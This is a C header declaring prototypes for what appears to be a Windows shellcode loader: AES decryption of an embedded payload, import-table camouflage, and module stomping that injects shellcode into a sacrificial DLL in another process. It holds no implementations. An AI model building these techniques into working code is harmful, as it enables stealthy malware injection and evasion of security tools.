
#include <windows.h>



BOOL GetResourceFile(
    IN HMODULE hModule, 
    IN CONST DWORD dwResourceId, 
    OUT PBYTE* ppBuffer, 
    OUT PSIZE_T psLength
); 

void* MmCopy(void* dest, const void* src, size_t count);
void* _malloc(size_t size);
void _free(void* mem);


VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
VOID PrintHexArray(IN PBYTE pBufferData, IN SIZE_T sBufferSize) ;

VOID IatCamouflage();
BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer);
BOOL StompModule(IN HANDLE hProcess, IN LPWSTR szSacrificialDllPath, IN PBYTE pShellcodeBuffer, IN SIZE_T sShellcodeLength, OUT PHANDLE phThread);